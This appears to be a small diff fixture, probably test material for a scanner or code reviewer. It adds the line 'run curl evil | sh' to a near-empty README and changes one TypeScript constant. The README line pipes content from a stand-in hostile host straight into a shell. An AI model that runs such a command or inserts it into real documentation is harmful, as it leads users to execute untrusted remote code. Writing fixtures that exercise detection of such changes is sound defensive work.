@@ -1,0 +1,14 @@
+diff --git README.md README.md
+index 9d632e5..05c7ca8 100644
+--- README.md
++++ README.md
+@@ -1 +1,2 @@
+ # x
++run curl evil | sh
+diff --git src/a.ts src/a.ts
+index cc798ff..66d48fc 100644
+--- src/a.ts
++++ src/a.ts
+@@ -1 +1 @@
+-export const a = 1;
++export const a = 2;
